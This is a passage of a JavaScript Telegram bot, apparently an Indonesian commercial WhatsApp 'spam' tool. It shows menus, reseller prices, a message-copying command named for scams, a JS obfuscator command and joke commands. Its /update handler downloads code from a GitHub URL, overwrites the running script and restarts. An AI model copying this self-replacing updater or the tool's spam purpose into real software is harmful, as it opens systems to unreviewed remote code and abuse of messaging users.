      },
    ],
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/fun", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ TOOLS MENU</strong></blockquote>
‎↯ /csessions - Scan Sender With Adp
‎↯ /tiktokdl - Download Video Tiktok  
‎↯ /testfunc - Function Test
‎↯ /cekfunc - Check Error Function
‎↯ /fixcode - Fix Error Function
‎↯ /salintoscam - Copy Text
‎↯ /statusweb - Check Status Website
‎↯ /cekid - Check Id User
‎↯ /encultra - Encryption Code
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/mnu",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Fun Menu λ 」",
        callback_data: "/tls2",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/tls2", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ FUN MENU</strong></blockquote>
‎↯ /createam - Create Alight Motion Prem
‎↯ /iqc - Iphone Quote Chat
‎↯ /spotify - Search Music
‎↯ /cecan - Random Girl
‎↯ /cogan - Random Boys
‎↯ /motivasi - Random Quotes
‎↯ /cekkodam - Cek Kodam
‎↯ /cekmiskin - Cek Miskin
‎↯ /cekbio - Check Bio WhatsApp
‎↯ /reactch - Reacting to Channel
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/fun",
        style: "primary",
      },
    ], 
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/harga", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ HARGA SCRIPT</strong></blockquote>
‎↯ Base Script - 25.000
‎↯ Full Update - 15.000
‎↯ Reseller - 25.000
‎↯ Partner - 35.000
‎↯ Moderator - 45.000
‎↯ Ceo - 50.000
‎↯ Owner - 65.000
‎↯ Tangan Kanan - 70.000
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/start",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Developer λ 」",
        url: "https://t.me/lendd3",
        style: "primary",
      },
      {
        text: "「 λ Testimoni λ 」",
        url: "https://t.me/infoarlend",
        style: "primary",
      },
    ],
    [
      {
        text: "「 λ Information Script λ 」",
        url: "https://t.me/informationarta",
        style: "primary",
      },
    ], 
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("tqto", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>⚚ INFORMATION SCRIPT</strong></blockquote>
» Script : Arta The Olympus X Death Whisper
» Developer : @lendd3
» Version : 14 Gen 2
» Platform : Telegram
» Type : Free spam and no spam
<blockquote><strong>⚚ INFORMATION USER</strong></blockquote>
» ID : ${userId}
» Username : @${username}
<blockquote><strong>⚚ STATUS BOT</strong></blockquote>
» Connection : ${senderStatus}
» Runtime : ${runtimeStatus}
<blockquote><strong>⚚ THANKS TO</strong></blockquote>
» Arlend Kaizen (Developer) 
» Daycinta (Girlfriend Arlend) 
» Fidz (Backup) 
» Giks (Backup) 
» Anya (Backup) 
» Morpho (Backup) 
» All Team Arta 
» All Buyer Arta
» All User Arta
<blockquote><strong>⚚ All Support Func</strong></blockquote>
» Pt Func Kxa
» Pt Func Jawa Timur
» Pt Funf Obx
» Pt Func Atx
» Pt Func Rena4you
<blockquote><strong>⚚ Arlend Dev Arta The Olympus </strong></blockquote>
`;

  const keyboard = [
    [
      {
        text: "「 λ Back λ 」",
        callback_data: "/start",
        style: "primary",
      },
    ], 
    [
      {
        text: "「 λ Developer λ 」",
        url: "https://t.me/lendd3",
        style: "primary",
      },
      {
        text: "「 λ Testimoni λ 」",
        url: "https://t.me/infoarlend",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});
// ================ Block & Open Cmd ================
const cmdFile = "./cmd.json";

let cmdData = { blocked: [] };

if (fs.existsSync(cmdFile)) {
  try {
    cmdData = JSON.parse(fs.readFileSync(cmdFile));
  } catch (err) {
    cmdData = { blocked: [] };
  }
}

function saveCmd() {
  fs.writeFileSync(cmdFile, JSON.stringify(cmdData, null, 2));
}

function isCommandBlocked(cmd) {
  return cmdData.blocked.includes(cmd);
}

bot.command("blockcmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/blockcmd /command");
  }
  const command = args[1].toLowerCase();
  if (!cmdData.blocked.includes(command)) {
    cmdData.blocked.push(command);
    saveCmd();
  }
  ctx.reply(`🚫 Command ${command} berhasil diblokir.`);
});

bot.command("opencmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/opencmd /command");
  }
  const command = args[1].toLowerCase();
  cmdData.blocked = cmdData.blocked.filter(c => c !== command);
  saveCmd();
  ctx.reply(`✅ Command ${command} sudah dibuka.`);
});

// 📋 COMMAND /SALINTOSCAM (CLONE & MIRROR MESSAGE MULTIMEDIA)
bot.command('salintoscam', async (ctx) => {
    try {
        // Cek apakah user melakukan reply ke suatu pesan atau tidak
        const repliedMsg = ctx.message.reply_to_message;
        if (!repliedMsg) {
            return ctx.replyWithHTML(
                `<blockquote><tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> <b>TIDAK ADA PESAN YANG DI-REPLY!</b>\n\n` +
                `Silakan balas (reply) ke pesan teks, foto, video, atau file yang ingin disalin, lalu ketik <code>/salintoscam</code>.</blockquote>`
            );
        }

        const chatId = ctx.chat.id;

        // 1. JIKA YANG DI-REPLY ADALAH TEKS MURNI
        if (repliedMsg.text) {
            await ctx.telegram.sendMessage(chatId, repliedMsg.text, {
                entities: repliedMsg.entities
            });
        }
        
        // 2. JIKA YANG DI-REPLY ADALAH FOTO
        else if (repliedMsg.photo) {
            const photoId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
            await ctx.telegram.sendPhoto(chatId, photoId, {
                caption: repliedMsg.caption,
                caption_entities: repliedMsg.caption_entities
            });
        }

        // 3. JIKA YANG DI-REPLY ADALAH VIDEO
        else if (repliedMsg.video) {
            await ctx.telegram.sendVideo(chatId, repliedMsg.video.file_id, {
                caption: repliedMsg.caption,
                caption_entities: repliedMsg.caption_entities
            });
        }

        // 4. JIKA YANG DI-REPLY ADALAH DOKUMEN / FILE
        else if (repliedMsg.document) {
            await ctx.telegram.sendDocument(chatId, repliedMsg.document.file_id, {
                caption: repliedMsg.caption,
                caption_entities: repliedMsg.caption_entities
            });
        }

        // 5. JIKA YANG DI-REPLY ADALAH STICKER
        else if (repliedMsg.sticker) {
            await ctx.telegram.sendSticker(chatId, repliedMsg.sticker.file_id);
        }

        // 6. JIKA YANG DI-REPLY ADALAH AUDIO
        else if (repliedMsg.audio) {
            await ctx.telegram.sendAudio(chatId, repliedMsg.audio.file_id, {
                caption: repliedMsg.caption,
                caption_entities: repliedMsg.caption_entities
            });
        } 
        
        // 7. JIKA YANG DI-REPLY ADALAH VOICE NOTE
        else if (repliedMsg.voice) {
            await ctx.telegram.sendVoice(chatId, repliedMsg.voice.file_id, {
                caption: repliedMsg.caption,
                caption_entities: repliedMsg.caption_entities
            });
        }

        // JIKA JENIS PESAN TIDAK DIKENALI
        else {
            await ctx.reply('<blockquote>❌ Jenis media pesan ini belum didukung untuk disalin</blockquote>', { parse_mode: 'HTML' });
        }

    } catch (error) {
        console.error("[ERROR] SalinToScam:", error.message);
        ctx.replyWithHTML(`<blockquote>❌ <b>Gagal menyalin pesan!</b>\n\nError: <code>${error.message}</code></blockquote>`);
    }
});

// =================== COMMAND /fixcode ===================
bot.command("fixcode", async (ctx) => {
  const replyMessage = ctx.message.reply_to_message;

  // 1. Validasi input: Harus reply ke teks atau file .js
  if (!replyMessage) {
    return ctx.reply(
      "<blockquote>⚠️ <b>Format Salah!</b>\nReply teks kode atau file <code>.js</code> yang error dengan perintah <code>/fixcode</code>.</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  let rawCode = "";
  let fileName = "fixed_code.js";

  const loadingMsg = await ctx.reply("<blockquote>⏳ Menganalisis dan memperbaiki sintaks kode...</blockquote>", { parse_mode: "HTML" });

  try {
    // Ambil isi kode dari file .js atau dari pesan teks biasa
    if (replyMessage.document && replyMessage.document.file_name.endsWith(".js")) {
      fileName = replyMessage.document.file_name.replace(".js", "_fixed.js");
      const fileLink = await ctx.telegram.getFileLink(replyMessage.document.file_id);
      const fileResponse = await axios.get(fileLink.href, { responseType: "text" });
      rawCode = fileResponse.data;
    } else if (replyMessage.text) {
      rawCode = replyMessage.text.replace(/\/fixcode|\/cekfunc/g, "").trim();
    } else {
      throw new Error("Pesan yang di-reply harus berupa teks kode atau file .js!");
    }

    if (!rawCode) {
      throw new Error("Kode kosong atau tidak ditemukan!");
    }

    // 2. Fungsi perbaikan otomatis (Syntax Auto-Fixer)
    let fixedCode = rawCode;

    // Perbaikan umum 1: Tanda petik tidak seimbang pada string multi-line
    fixedCode = fixedCode.replace(/`([^`]*)$/gm, "`"); 

    // Perbaikan umum 2: Karakter tersembunyi / Non-breaking space
    fixedCode = fixedCode.replace(/\u00A0/g, " ");

    // Perbaikan umum 3: Penutupan kurung pengerjaan otomatis (Bracket Balancer)
    const openBrackets = (fixedCode.match(/[\{\[\(]/g) || []).length;     const closeBrackets = (fixedCode.match(/[\}\]\)]/g) || []).length;

    if (openBrackets > closeBrackets) {
      const diff = openBrackets - closeBrackets;
      // Menambahkan penutup kurung siku/kurawal yang kurang di akhir file
      const missingBraces = "}".repeat(diff);
      fixedCode = fixedCode.trimEnd() + "\n" + missingBraces;
    }

    // 3. Validasi ulang hasil perbaikan menggunakan AST Parser (acorn)
    let isSyntaxValid = false;
    try {
      acorn.parse(fixedCode, { ecmaVersion: "latest", sourceType: "script" });
      isSyntaxValid = true;
    } catch (parseErr) {
      // Jika masih error pada mode script, coba cek sebagai ES Module
      try {
        acorn.parse(fixedCode, { ecmaVersion: "latest", sourceType: "module" });
        isSyntaxValid = true;
      } catch (modErr) {
        throw new Error(`Sintaks terlalu rusak: ${parseErr.message}`);
      }
    }

    await safeDelete(ctx, loadingMsg.message_id);

    // 4. Output: Kirim sebagai file jika kode panjang, atau sebagai teks jika pendek
    if (fixedCode.length > 3000 || replyMessage.document) {
      const codeBuffer = Buffer.from(fixedCode, "utf-8");
      await ctx.replyWithDocument(
        { source: codeBuffer, filename: fileName },
        {
          caption: `<blockquote>✅ <b>FIX CODE SUCCESS</b>\n\nSintaks telah diverifikasi & diperbaiki.\n👤 <b>Requested by:</b> @${ctx.from.username || ctx.from.first_name}</blockquote>`,
          parse_mode: "HTML"
        }
      );
    } else {
      await ctx.reply(
        `<blockquote>✅ <b>FIX CODE SUCCESS</b>\n\n<pre><code class="language-javascript">${fixedCode}</code></pre></blockquote>`,
        { parse_mode: "HTML" }
      );
    }

  } catch (error) {
    await safeDelete(ctx, loadingMsg.message_id);
    const errMsg = error.message || "Gagal memperbaiki kode.";
    ctx.reply(`<blockquote>❌ <b>Perbaikan Gagal:</b> ${errMsg}</blockquote>`, { parse_mode: "HTML" });
  }
});
// =================== COMMAND /encultra ===================
bot.command("encultra", async (ctx) => {
  const replyMessage = ctx.message.reply_to_message;

  // 1. Validasi apakah user melakukan reply ke pesan berisi dokumen/file .js
  if (!replyMessage || !replyMessage.document) {
    return ctx.reply(
      "<blockquote>⚠️ <b>Format Salah!</b>\nKirim file <code>.js</code> kamu, lalu <b>reply/balas</b> file tersebut dengan mengetik <code>/encultra</code>.</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  const document = replyMessage.document;

  if (!document.file_name.endsWith(".js")) {
    return ctx.reply("<blockquote>❌ File yang di-reply harus berformat <b>.js</b>!</blockquote>", { parse_mode: "HTML" });
  }

  const loadingMsg = await ctx.reply("<blockquote>⏳ Mengunduh dan mengenkripsi file JavaScript...</blockquote>", { parse_mode: "HTML" });

  try {
    // 2. Dapatkan link download file dari server Telegram
    const fileLink = await ctx.telegram.getFileLink(document.file_id);

    // 3. Download isi file sebagai text
    const fileResponse = await axios.get(fileLink.href, { responseType: "text" });
    const rawCode = fileResponse.data;

    // 4. Proses Obfuscation dengan konfigurasi yang aman (tidak merusak variabel/logika)
    const obfuscatedResult = JavaScriptObfuscator.obfuscate(rawCode, {
      compact: true,
      controlFlowFlattening: false, // Diset false agar fungsi async/await dan Telegraf handler tidak error
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: false,
      identifierNamesGenerator: "hexadecimal",
      log: false,
      numbersToExpressions: false,
      renameGlobals: false, // Sangat penting agar variabel bawaan Node.js/Telegraf tidak rusak
      selfDefending: false,
      simplify: true,
      splitStrings: false,
      stringArray: true,
      stringArrayCallsTransform: true,
      stringArrayEncoding: ["base64"],
      stringArrayIndexShift: true,
      stringArrayRotate: true,
      stringArrayShuffle: true,
      stringArrayWrappersCount: 1,
      stringArrayWrappersChainedCalls: true,
      stringArrayWrappersParametersMaxCount: 2,
      stringArrayWrappersType: "variable",
      stringArrayThreshold: 0.75,
      unicodeEscapeSequence: false
    });

    const encCode = obfuscatedResult.getObfuscatedCode();

    // 5. Ubah string hasil enc menjadi Buffer
    const encBuffer = Buffer.from(encCode, "utf-8");
    const newFileName = document.file_name.replace(".js", "_enc.js");

    // Hapus pesan loading
    await safeDelete(ctx, loadingMsg.message_id);

    // 6. Kirim kembali hasilnya dalam bentuk file .js
    await ctx.replyWithDocument(
      {
        source: encBuffer,
        filename: newFileName
      },
      {
        caption: `<blockquote>🔐 <b>SUCCESS OBFUSCATE JS</b>\n\n📄 <b>File:</b> <code>${newFileName}</code>\n👤 <b>Requested by:</b> @${ctx.from.username || ctx.from.first_name}</blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    await safeDelete(ctx, loadingMsg.message_id);
    const errMsg = error.message || "Terjadi kesalahan saat memproses file.";
    ctx.reply(`<blockquote>❌ Gagal mengenkripsi file: ${errMsg}</blockquote>`, { parse_mode: "HTML" });
  }
});

// =================== COMMAND /cekmiskin ===================
bot.command("cekmiskin", async (ctx) => {
  // Generate persentase acak 0 - 100%
  const percentage = Math.floor(Math.random() * 101);
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  // Menentukan tingkat kemiskinan berdasarkan persentase
  let level = "";
  if (percentage <= 20) {
    level = "Sultan Kaya Raya 🤑";
  } else if (percentage <= 40) {
    level = "Aman / Masih Bisa Beli Boba 🧋";
  } else if (percentage <= 60) {
    level = "Sederhana / Cukup Buat Makan 🍚";
  } else if (percentage <= 80) {
    level = "Di Ujung Tanduk / Mode Hemat 💸";
  } else {
    level = "Miskin Akut / Tinggal Promag 💊";
  }

  // Kirim hasil ke chat
  await ctx.reply(
    `<blockquote>📉 <b>CEK TINGKAT KEMISKINAN</b>\n\n${username} tingkat kemiskinan kamu adalah <b>${percentage}%</b>\n<b>Kategori:</b> ${level}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// =================== COMMAND /cekkodam ===================
bot.command("cekkodam", async (ctx) => {
  // Daftar khodam lucu/unik
  const khodamList = [
    "Macan Pemarah",
    "Naga Karbu",
    "Buaya Darat",
    "Kancil Keramas",
    "Bebek Kayang",
    "Kucing Oren Garong",
    "Tupai Kayu",
    "Singa Salto",
    "Ayam Sayur",
    "Kambing Mendoan",
    "Panda Depresi",
    "Gajah Mini",
    "Semut Rangrang",
    "Cacing Alaska",
    "Belut Listrik Luber",
    "Kuda Poni Kesurupan",
    "Cicak Dinding",
    "Kecoa Terbang",
    "Lalat Hijau",
    "Katak Bhizer"
  ];

  // Ambil 1 khodam secara acak
  const randomKhodam = khodamList[Math.floor(Math.random() * khodamList.length)];
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  // Kirim hasil dengan tag user
  await ctx.reply(
    `<blockquote>🔮 <b>CEK KHODAM</b>\n\n${username} khodam kamu <b>${randomKhodam}</b></blockquote>`,
    { parse_mode: "HTML" }
  );
});

// =================== COMMAND /motivasi ===================
bot.command("motivasi", async (ctx) => {
  // Daftar kata-kata motivasi
  const motivasiList = [
    "Jangan pernah menyerah, karena proses tidak akan pernah mengkhianati hasil.",
    "Kegagalan hari ini adalah awal dari keberhasilan esok hari. Bangkit dan coba lagi!",
    "Impianmu tidak akan terwujud dengan sendirinya, kamu harus berjuang untuk meraihnya.",
    "Bekerjalah sampai hal yang mahal menjadi terasa murah.",
    "Fokus pada prosesnya, bukan hanya pada hasilnya. Nikmati setiap langkah kecilmu.",
    "Kesuksesan terbesar kita bukan karena tidak pernah gagal, tetapi bagaimana kita bangkit setiap kali jatuh.",
    "Masa depan ditentukan oleh apa yang kamu lakukan hari ini, bukan esok hari.",
    "Jangan bandingkan prosesmu dengan orang lain. Setiap orang punya garis start dan finish yang berbeda.",
    "Tetap rendah hati saat di atas, dan tetap kuat saat berada di bawah.",
    "Satu-satunya batasan untuk meraih mimpi kita adalah keraguan kita hari ini.",
    "Konsistensi adalah kunci utama dari setiap pencapaian besar.",
    "Berhentilah takut gagal, mulailah takut jika kamu tidak pernah mencoba.",
    "Setiap hari adalah kesempatan baru untuk menjadi versi diri kamu yang lebih baik.",
    "Rezeki tidak akan tertukar, teruslah berusaha dan percaya pada takdir terbaik.",
    "Capek boleh, menyerah jangan. Istirahat sejenak lalu lanjutkan perjuanganmu!",
    "Hasil besar selalu dimulai dari langkah-langkah kecil yang konsisten.",
    "Orang sukses tidak pernah mencari alasan, mereka fokus mencari jalan keluar.",
    "Terkadang kamu harus melewati hari-hari terburuk untuk mendapatkan hari-hari terbaik.",
    "Keyakinan adalah langkah pertama, bahkan ketika kamu tidak melihat seluruh tangga.",
    "Disiplin adalah jembatan antara tujuan dan pencapaian.",
    "Ubah kata 'aku tidak bisa' menjadi 'aku belum bisa, tapi aku akan belajar'.",
    "Pikiran positif membawa energi positif dan hasil yang luar biasa.",
    "Jangan menunggu waktu yang tepat, buatlah waktu yang ada menjadi tepat.",
    "Rasa sakit dalam berjuang hanya sementara, tapi penyesalan karena menyerah akan terasa selamanya.",
    "Investasi terbaik yang bisa kamu lakukan adalah berinvestasi pada dirimu sendiri.",
    "Orang yang berhenti belajar akan menjadi pemilik masa lalu, orang yang terus belajar akan menjadi pemilik masa depan.",
    "Keberanian bukan berarti tidak ada rasa takut, melainkan kemampuan untuk terus maju meski ada rasa takut.",
    "Tantangan adalah hal yang membuat hidup menarik, dan melaluinya adalah hal yang membuat hidup berarti.",
    "Fokuslah menjadi lebih baik dari dirimu yang kemarin, bukan lebih baik dari orang lain.",
    "Impian besar membutuhkan kerja keras yang besar dan kesabaran yang ekstra."
  ];

  // Mengambil 1 kata motivasi secara acak dari array
  const randomMotivasi = motivasiList[Math.floor(Math.random() * motivasiList.length)];

  // Kirim kata-kata motivasi ke chat
  await ctx.reply(
    `<blockquote>💡 <b>MOTIVASI HARI INI</b>\n\n"${randomMotivasi}"\n\n<i>Requested by: @${ctx.from.username || ctx.from.first_name}</i></blockquote>`,
    { parse_mode: "HTML" }
  );
});

// =================== COMMAND /cogan ===================
bot.command("cogan", async (ctx) => {
  // Array berisi seluruh link foto cogan dari Catbox
  const coganList = [
    "https://files.catbox.moe/eol5ji.jpg",
    "https://files.catbox.moe/0ib3qs.jpg",
    "https://files.catbox.moe/vrvazl.jpg",
    "https://files.catbox.moe/2me3vm.jpg",
    "https://files.catbox.moe/1w5ww4.jpg",
    "https://files.catbox.moe/83oc88.jpg",
    "https://files.catbox.moe/x96l13.jpg",
    "https://files.catbox.moe/fmobm1.jpg",
    "https://files.catbox.moe/qupi1c.jpg",
    "https://files.catbox.moe/bcnkke.jpg",
    "https://files.catbox.moe/t4hs47.jpg",
    "https://files.catbox.moe/oklif6.jpg",
    "https://files.catbox.moe/27gccs.jpg",
    "https://files.catbox.moe/vs5c7f.jpg",
    "https://files.catbox.moe/tlubvf.jpg",
    "https://files.catbox.moe/h7e3hx.jpg",
    "https://files.catbox.moe/91n2s5.jpg"
  ];

  // Mengambil 1 link secara acak dari array
  const randomImage = coganList[Math.floor(Math.random() * coganList.length)];

  const loadingMsg = await ctx.reply("<blockquote>⏳ Mengambil foto random...</blockquote>", { parse_mode: "HTML" });

  try {
    // Download gambar sebagai Buffer agar pengiriman aman dan stabil
    const imageBuffer = await axios.get(randomImage, { responseType: "arraybuffer" });

    // Hapus pesan loading
    await safeDelete(ctx, loadingMsg.message_id);

    // Kirim foto ke chat tempat perintah diketik
    await ctx.replyWithPhoto(
      { source: Buffer.from(imageBuffer.data) },
      {
        caption: `<blockquote>✨ <b>Random Cogan</b>\n\n<i>Requested by: @${ctx.from.username || ctx.from.first_name}</i></blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    await safeDelete(ctx, loadingMsg.message_id);
    const errMsg = error.response?.data?.message || error.message;
    ctx.reply(`<blockquote>❌ Gagal mengirim gambar: ${errMsg}</blockquote>`, { parse_mode: "HTML" });
  }
});

// =================== COMMAND /cecan ===================
bot.command("cecan", async (ctx) => {
  const cecanList = [
    "https://files.catbox.moe/6qok0z.jpg",
    "https://files.catbox.moe/mdd6wt.jpg",
    "https://files.catbox.moe/pt31qs.jpg",
    "https://files.catbox.moe/4xzt62.jpg", 
    "https://files.catbox.moe/gwebq1.jpg", 
    "https://files.catbox.moe/sq93k6.jpg", 
    "https://files.catbox.moe/cvciyj.jpg", 
    "https://files.catbox.moe/ly4dkk.jpg", 
    "https://files.catbox.moe/a4cy8m.jpg", 
    "https://files.catbox.moe/icg0ck.jpg", 
    "https://files.catbox.moe/5huhgx.jpg", 
    "https://files.catbox.moe/xlgqwi.jpg", 
    "https://files.catbox.moe/u6apth.jpg", 
    "https://files.catbox.moe/qzdjog.jpg", 
    "https://files.catbox.moe/kr5xyn.jpg", 
    "https://files.catbox.moe/2qu8su.jpg", 
    "https://files.catbox.moe/7hluim.jpg", 
    "https://files.catbox.moe/psy57n.jpg", 
    "https://files.catbox.moe/khju43.jpg", 
    "https://files.catbox.moe/bzjifc.jpg", 
    "https://files.catbox.moe/qcl362.jpg", 
    "https://files.catbox.moe/33thgo.jpg", 
    "https://files.catbox.moe/z9v26p.jpg", 
    "https://files.catbox.moe/1lgm0v.jpg"
  ];

  // Mengambil 1 link secara acak dari array
  const randomImage = cecanList[Math.floor(Math.random() * cecanList.length)];

  const loadingMsg = await ctx.reply("<blockquote>⏳ Mengambil foto random...</blockquote>", { parse_mode: "HTML" });

  try {
    // Download gambar sebagai Buffer
    const imageBuffer = await axios.get(randomImage, { responseType: "arraybuffer" });

    // Hapus pesan loading
    await safeDelete(ctx, loadingMsg.message_id);

    // Kirim foto ke chat
    await ctx.replyWithPhoto(
      { source: Buffer.from(imageBuffer.data) },
      {
        caption: `<blockquote>✨ <b>Random Cecan</b>\n\n<i>Requested by: @${ctx.from.username || ctx.from.first_name}</i></blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    await safeDelete(ctx, loadingMsg.message_id);
    const errMsg = error.response?.data?.message || error.message;
    ctx.reply(`<blockquote>❌ Gagal mengirim gambar: ${errMsg}</blockquote>`, { parse_mode: "HTML" });
  }
});

// ============ COMMAND AUTO UPDATE ============
const updateUrl = "https://raw.githubusercontent.com/lendkz/autoupdate/refs/heads/main/ArtaXWhisper.js";

bot.command("update", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ » Akses hanya untuk pemilik");
  }

  const waitMsg = await ctx.reply("⏳ Memeriksa pembaruan dari sistem...");

  try {
    const response = await axios.get(updateUrl, {
      headers: { "Cache-Control": "no-cache" },
      timeout: 10000
    });

    if (response.status !== 200 || !response.data) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        waitMsg.message_id,
        null,
        "❌ File update di sistem kosong, belum ada update terbaru."
      );
    }

    // --- VALIDASI FILE KOSONG DITAMBAHKAN DI SINI ---
    if (typeof response.data !== "string" || response.data.trim().length === 0) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        waitMsg.message_id,
        null,
        "❌ File update di sistem kosong. Pembaruan dibatalkan."
      );
    }

    const currentScript = fs.readFileSync(__filename, "utf8");
    const newScript = response.data;

    if (currentScript === newScript) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        waitMsg.message_id,
        null,
        "✅ Script Anda sudah versi terbaru."
      );
    }

    fs.writeFileSync(__filename, newScript, "utf8");

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      waitMsg.message_id,
      null,
      "✅ Berhasil memperbarui script! Bot akan merestart otomatis..."
    );

    setTimeout(() => {
      process.exit(1);
    }, 2000);

  } catch (error) {
    console.error("Error auto update:", error.message);
    ctx.telegram.editMessageText(
      ctx.chat.id,
      waitMsg.message_id,
      null,
      "❌ Belum ada info update script di dalam sistem database kami."
    );
  }
});

// ============ COMMAND CEK UPDATE ============
bot.command("cekupdate", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ » Akses hanya untuk pemilik");
  }

  const waitMsg = await ctx.reply("⏳ Memeriksa pembaruan dari sistem...");

  try {
    const response = await axios.get(updateUrl, {
      headers: { "Cache-Control": "no-cache" },
      timeout: 10000
    });

    if (response.status !== 200 || !response.data) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        waitMsg.message_id,
        null,
        "❌ Belum ada update script atau file baru di dalam sistem."
      );
    }

    // --- VALIDASI FILE KOSONG DITAMBAHKAN DI SINI ---
    if (typeof response.data !== "string" || response.data.trim().length === 0) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        waitMsg.message_id,
        null,
        "❌ File update di sistem kosong, belum ada update terbaru."
      );
    }

    const currentScript = fs.readFileSync(__filename, "utf8");
    const newScript = response.data;

    if (currentScript === newScript) {
      return ctx.telegram.editMessageText(
